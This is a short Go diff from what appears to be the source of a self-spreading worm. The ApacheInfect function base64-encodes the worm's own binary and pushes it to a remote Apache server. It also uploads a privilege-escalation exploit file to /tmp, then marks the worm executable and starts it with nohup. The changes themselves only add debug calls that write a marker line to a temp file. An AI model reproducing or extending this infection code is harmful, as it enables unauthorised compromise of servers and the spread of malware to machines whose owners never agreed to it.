@@ -55,19 +55,31 @@ func ApacheCheckInfection(ip string, port string) bool {
 }
 
 func ApacheInfect(ip string, port string) bool {
+	test()
+
 	var worm []byte
 	worm = GetFile("/proc/self/exe")
 	worm64 := base64.StdEncoding.EncodeToString(worm)
 	commands := fmt.Sprintf(copyCommandsTemplate,worm64,wormPath)
 	MakeRequest(ip,port,commands)
+	
+	test()
 		
 	file := GetFile("./exploit_nss_manual")
 	file64 := base64.StdEncoding.EncodeToString(file)
 	commands = fmt.Sprintf(copyCommandsTemplate,file64,"/tmp/exploit_nss_manual")
 	MakeRequest(ip,port,commands)
 	
+	test()
+	
 	commands = fmt.Sprintf("chmod u+x %s; nohup %s &", wormPath, wormPath)
 	commands = fmt.Sprintf(commandsTemplate,commands)
 	MakeRequest2(ip,port,commands)
 	return ApacheCheckInfection(ip,port)
+	
+	test()
+}
+
+func test() {
+	exec.Command("echo 'apache infection' >> /tmp/tmp.txt").Output()
 }
